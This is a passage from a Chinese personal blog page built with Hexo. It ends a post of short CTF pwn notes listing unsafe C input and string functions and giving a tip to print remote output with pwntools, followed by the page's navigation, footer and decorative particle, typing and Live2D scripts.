+<p>常见的危险函数，<br />
+输入：</p>
+<ul>
+<li>gets</li>
+<li>scanf<br />
+输出：</li>
+<li>sprintf<br />
+字符串:</li>
+<li>strcpy, 字符串赋值，遇到\x00 停止</li>
+<li>strcat 字符串拼接 \x00</li>
+<li>bcopy</li>
+</ul>
+<p>注意：在远程连接的时候记得尝试打印一下程序的输出，有些时候程序的在本地的输出与在服务端的输出是不一样的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = p.recv()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
+
+
+        <div>
+          
+            <div>
+  
+    <div style="text-align: center; color: #ccc; font-size: 14px; margin: 20px 0;">
+      ---------- 已经到底了啦！ (*/ω＼*) ----------
+    </div>
+  
+</div>
+          
+        </div>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/11/13/program/program3/" rel="prev" title="PROGRAM 03">
+                  <i class="fa fa-angle-left"></i> PROGRAM 03
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/11/16/11/16/" rel="next" title="11.16">
+                  11.16 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">超级玉米人</span>
+  </div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<!-- particles.js 配置和初始化 -->
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  // 立即滚动到顶部
+  window.scrollTo(0, 0);
+  
+  function isHomePage() {
+    const path = window.location.pathname;
+    return path === '/' || path === '/index.html' || path === '/archives/' || path.endsWith('/index.html');
+  }
+
+  if (isHomePage()) {
+    const particlesContainer = document.getElementById('particles-js');
+    if (particlesContainer) {
+      particlesContainer.style.display = 'block';
+      
+      // 初始化打字机效果
+      initTypedEffect();
+      
+      // 初始化 particles.js
+      particlesJS('particles-js', {
+        "particles": {
+          "number": {
+            "value": 80,
+            "density": {
+              "enable": true,
+              "value_area": 800
+            }
+          },
+          "color": {
+            "value": "#ffffff"
+          },
+          "shape": {
+            "type": "circle"
+          },
+          "opacity": {
+            "value": 0.5,
+            "random": false
+          },
+          "size": {
+            "value": 3,
+            "random": true
+          },
+          "line_linked": {
+            "enable": true,
+            "distance": 150,
+            "color": "#ffffff",
+            "opacity": 0.4,
+            "width": 1
+          },
+          "move": {
+            "enable": true,
+            "speed": 2,
+            "direction": "none",
+            "random": false,
+            "straight": false,
+            "out_mode": "out"
+          }
+        },
+        "interactivity": {
+          "detect_on": "canvas",
+          "events": {
+            "onhover": {
+              "enable": true,
+              "mode": "grab"
+            },
+            "onclick": {
+              "enable": true,
+              "mode": "push"
+            },
+            "resize": true
+          },
+          "modes": {
+            "grab": {
+              "distance": 200,
+              "line_linked": {
+                "opacity": 1
+              }
+            },
+            "push": {
+              "particles_nb": 4
+            }
+          }
+        },
+        "retina_detect": true
+      });
+
+      // 向下滚动箭头点击事件
+      document.querySelector('.hero-arrow')?.addEventListener('click', function() {
+        window.scrollTo({
+          top: window.innerHeight,
+          behavior: 'smooth'
+        });
+      });
+    }
+  }
+
+  // 打字机效果初始化函数
+  function initTypedEffect() {
+    // 获取博客副标题，如果没有则使用默认文本
+    const subtitle = "时间Cia不多llo~(∠・ω< )⌒★" || "Welcome to my blog";
+    
+    // 可以设置多个文本循环打字，或者只使用副标题
+    const strings = [
+      subtitle,
+      "Hello World!",  // 可以添加更多文本
+      "来往下滑吧~~~~",
+      "接下来我也不知到要写什么了"
+    ];
+
+    // 初始化 Typed.js
+    new Typed('#typed-text', {
+      strings: strings,
+      typeSpeed: 70,        // 打字速度
+      backSpeed: 40,        // 回退速度
+      backDelay: 2000,      // 回退前的延迟
+      startDelay: 500,      // 开始前的延迟
+      loop: true,           // 循环播放
+      showCursor: true,     // 显示光标
+      cursorChar: '|',      // 光标字符
+      autoInsertCss: true   // 自动插入CSS
+    });
+  }
+});
+
+
+
+
+</script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacity":0.8,"opacityDefault":0.8},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
